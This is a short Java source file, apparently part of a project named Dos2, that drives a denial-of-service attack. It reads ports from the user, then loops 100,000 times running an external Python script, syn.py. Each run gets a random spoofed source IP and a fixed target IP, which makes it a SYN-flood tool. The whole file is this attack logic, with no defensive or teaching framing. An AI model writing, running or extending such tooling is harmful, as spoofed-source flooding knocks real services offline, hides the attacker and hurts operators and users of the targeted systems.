package Base;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;

/**
 * Created by kenzi on 11/14/16.
 */
public class Run {

    public static void run(){

        Scanner input = new Scanner(System.in);
        System.out.print("Type open ports after \'-a\':");
        String usrinput = input.nextLine();

        for (int i = 0; i < 100000 ; i++) {

            String sourceIP = IpAddress.getRandomStringIp();
            String tarhetIP = IpAddress.targetIp;

            String cmd = "python /home/kenzi/Dos2/out/artifacts/Dos2_jar/syn.py" + " -r " + sourceIP + " -t " + tarhetIP + " " + usrinput;
            System.out.println(cmd);

            try {
                Runtime r = Runtime.getRuntime();
                Process p = r.exec(cmd);

                BufferedReader in = new BufferedReader(new
                        InputStreamReader(p.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    System.out.println(inputLine);
                }
                in.close();


            } catch (IOException e) {
                System.out.println(e);
            }
        }



    }
}